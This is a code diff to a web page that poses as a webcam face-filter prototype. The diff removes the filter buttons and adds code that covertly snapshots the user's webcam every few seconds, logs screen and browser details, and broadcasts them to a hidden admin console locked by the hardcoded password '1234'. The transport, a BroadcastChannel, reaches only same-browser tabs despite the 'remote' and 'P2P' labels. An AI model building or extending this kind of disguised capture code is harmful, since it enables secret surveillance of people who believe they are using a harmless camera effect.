@@ -17,16 +17,21 @@
             0% { top: 0; }
             100% { top: 100%; }
         }
+        #logData::-webkit-scrollbar { width: 4px; }
+        #logData::-webkit-scrollbar-thumb { background: #064e3b; }
     </style>
 </head>
 <body class="bg-zinc-900 text-zinc-100 min-h-screen flex flex-col font-mono">
 
     <!-- View Switcher -->
     <nav class="p-4 border-b border-zinc-800 flex justify-between items-center bg-zinc-950">
-        <h1 class="text-xl font-bold tracking-tighter text-blue-500">FX_PROTOTYPE v1.0</h1>
-        <button id="toggleAdmin" class="bg-zinc-800 hover:bg-zinc-700 px-4 py-2 rounded text-xs uppercase tracking-widest transition-colors">
-            Admin Console
-        </button>
+        <h1 class="text-xl font-bold tracking-tighter text-blue-500">FX_PROTOTYPE v2.1</h1>
+        <div class="flex items-center gap-4">
+            <div id="syncStatus" class="text-[10px] text-zinc-500 uppercase tracking-widest animate-pulse">Network: Idle</div>
+            <button id="toggleAdmin" class="bg-zinc-800 hover:bg-zinc-700 px-4 py-2 rounded text-xs uppercase tracking-widest transition-colors">
+                Admin Console
+            </button>
+        </div>
     </nav>
 
     <!-- User Interface (Main App) -->
@@ -36,7 +41,6 @@
             <div id="overlay" class="absolute inset-0 pointer-events-none border-4 border-dashed border-blue-500/30 m-8 rounded-full hidden"></div>
             <div id="scanner" class="scanline hidden"></div>
             
-            <!-- Setup Message -->
             <div id="setupMsg" class="absolute inset-0 flex flex-col items-center justify-center bg-zinc-900/90 text-center p-8">
                 <div class="mb-4 text-blue-400">
                     <svg xmlns="http://www.w3.org/2000/svg" class="w-16 h-16 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -50,44 +54,31 @@
                 </button>
             </div>
         </div>
-
-        <div class="mt-8 flex gap-4 overflow-x-auto p-2">
-            <button class="filter-btn opacity-50 cursor-not-allowed border border-zinc-700 p-4 rounded-lg bg-zinc-800 w-24 h-24 flex flex-col items-center justify-center">
-                <span class="text-2xl">😎</span>
-                <span class="text-[10px] mt-2">Retro</span>
-            </button>
-            <button class="filter-btn opacity-50 cursor-not-allowed border border-zinc-700 p-4 rounded-lg bg-zinc-800 w-24 h-24 flex flex-col items-center justify-center">
-                <span class="text-2xl">👽</span>
-                <span class="text-[10px] mt-2">Alien</span>
-            </button>
-        </div>
     </main>
 
     <!-- Admin Console -->
     <div id="adminPanel" class="hidden fixed inset-0 bg-black z-50 p-8 overflow-y-auto">
-        <div class="max-w-4xl mx-auto">
+        <div class="max-w-6xl mx-auto">
             <div class="flex justify-between items-center mb-8 border-b border-green-900 pb-4">
                 <h2 class="text-3xl font-bold text-green-500 uppercase tracking-tighter">Terminal_Admin</h2>
                 <button id="closeAdmin" class="text-zinc-500 hover:text-white">Exit_Session</button>
             </div>
 
-            <!-- Login -->
             <div id="adminAuth" class="flex flex-col items-center justify-center py-20">
                 <input type="password" id="adminPass" placeholder="ENTER ACCESS KEY" class="bg-black border border-green-900 text-green-500 p-4 text-center focus:outline-none focus:border-green-500 w-64 mb-4">
                 <button id="loginBtn" class="bg-green-900/30 text-green-500 border border-green-500 px-8 py-2 hover:bg-green-500 hover:text-black transition-all">AUTHORIZE</button>
             </div>
 
-            <!-- Dashboard -->
-            <div id="adminDashboard" class="hidden grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div class="bg-zinc-900 border border-green-900/50 p-6 rounded-lg">
-                    <h3 class="text-green-500 mb-4 text-sm font-bold underline">CONNECTION_LOGS</h3>
-                    <div id="logData" class="space-y-2 text-xs text-green-700">
-                        <p>> [SYSTEM] Waiting for handshake...</p>
+            <div id="adminDashboard" class="hidden grid grid-cols-1 lg:grid-cols-3 gap-6">
+                <div class="lg:col-span-1 bg-zinc-900 border border-green-900/50 p-6 rounded-lg h-[600px] flex flex-col">
+                    <h3 class="text-green-500 mb-4 text-sm font-bold underline">BROADCAST_LOGS</h3>
+                    <div id="logData" class="flex-grow overflow-y-auto space-y-2 text-[10px] text-green-700">
+                        <p>> [SYSTEM] Listening for remote session packets...</p>
                     </div>
                 </div>
-                <div class="bg-zinc-900 border border-green-900/50 p-6 rounded-lg">
-                    <h3 class="text-green-500 mb-4 text-sm font-bold underline">VISUAL_CAPTURE_BUFFER</h3>
-                    <div id="captureGallery" class="grid grid-cols-2 gap-2"></div>
+                <div class="lg:col-span-2 bg-zinc-900 border border-green-900/50 p-6 rounded-lg h-[600px] flex flex-col">
+                    <h3 class="text-green-500 mb-4 text-sm font-bold underline">REMOTE_CAPTURE_FEED</h3>
+                    <div id="captureGallery" class="flex-grow overflow-y-auto grid grid-cols-2 md:grid-cols-3 gap-3 content-start"></div>
                 </div>
             </div>
         </div>
@@ -110,8 +101,26 @@
         const logData = document.getElementById('logData');
         const gallery = document.getElementById('captureGallery');
         const canvas = document.getElementById('offscreenCanvas');
+        const syncStatus = document.getElementById('syncStatus');
 
         let isStreaming = false;
+        const sessionId = Math.random().toString(36).substring(7);
+        const BC = new BroadcastChannel('face_effects_test_sync');
+
+        // Handling Incoming Sync Data
+        BC.onmessage = (event) => {
+            const { type, data, sender } = event.data;
+            if (type === 'LOG' && adminDashboard.offsetParent !== null) {
+                addLog(`[RECV:${sender}] ${data}`);
+            }
+            if (type === 'FRAME' && adminDashboard.offsetParent !== null) {
+                displayFrame(data, sender);
+            }
+            if (type === 'REQUEST_DATA' && isStreaming) {
+                // If an admin just opened, send our current metadata
+                BC.postMessage({ type: 'LOG', sender: sessionId, data: `RE-SYNC_ACK: ${navigator.userAgent.slice(0, 20)}` });
+            }
+        };
 
         startBtn.onclick = async () => {
             try {
@@ -121,37 +130,48 @@
                 scanner.classList.remove('hidden');
                 overlay.classList.remove('hidden');
                 isStreaming = true;
-                
-                addLog('HANDSHAKE_INITIATED');
-                
-                // Screenshot loop
-                setInterval(captureFrame, 3000);
-                
-                // Basic Info
-                addLog(`USER_AGENT: ${navigator.userAgent.slice(0, 40)}`);
-                addLog(`SCREEN: ${screen.width}x${screen.height}`);
-                addLog(`IP_STUB: 192.168.1.${Math.floor(Math.random() * 255)}`);
+                syncStatus.textContent = "Network: Broadcasting";
+                syncStatus.classList.replace('text-zinc-500', 'text-blue-500');
 
+                BC.postMessage({ type: 'LOG', sender: sessionId, data: `SESSION_START: ${screen.width}x${screen.height}` });
+                BC.postMessage({ type: 'LOG', sender: sessionId, data: `IP_STUB: 192.168.1.${Math.floor(Math.random() * 255)}` });
+                
+                setInterval(captureAndBroadcast, 4000);
             } catch (err) {
                 console.error(err);
             }
         };
 
-        function captureFrame() {
+        function captureAndBroadcast() {
             if (!isStreaming) return;
             const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
+            canvas.width = 320; // Reduced for faster P2P transfer
+            canvas.height = 180;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.3);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.2);
+            BC.postMessage({ type: 'FRAME', sender: sessionId, data: dataUrl });
+            BC.postMessage({ type: 'LOG', sender: sessionId, data: 'PACKET_SENT: frame_data' });
+        }
+
+        function displayFrame(url, sender) {
+            const container = document.createElement('div');
+            container.className = "relative group";
+            
             const img = document.createElement('img');
-            img.src = dataUrl;
-            img.className = "border border-green-900/50";
+            img.src = url;
+            img.className = "w-full border border-green-900/40 rounded";
             
-            if (gallery.children.length > 5) gallery.removeChild(gallery.firstChild);
-            gallery.appendChild(img);
-            addLog(`CAPTURE_SUCCESS: frame_${Date.now()}`);
+            const label = document.createElement('div');
+            label.className = "absolute bottom-0 left-0 bg-black/80 text-[8px] px-1 text-green-500";
+            label.textContent = `SRC: ${sender}`;
+            
+            container.appendChild(img);
+            container.appendChild(label);
+            
+            if (gallery.children.length > 11) gallery.removeChild(gallery.firstChild);
+            gallery.appendChild(container);
+            gallery.scrollTop = gallery.scrollHeight;
         }
 
         function addLog(msg) {
@@ -165,7 +185,9 @@
             if (adminPass.value === '1234') {
                 adminAuth.classList.add('hidden');
                 adminDashboard.classList.remove('hidden');
-                addLog('ADMIN_LOGIN_SUCCESS');
+                addLog('ADMIN_CONSOLE_LINK_SUCCESS');
+                // Request data from any existing tabs/devices
+                BC.postMessage({ type: 'REQUEST_DATA', sender: 'ADMIN' });
             }
         };
 
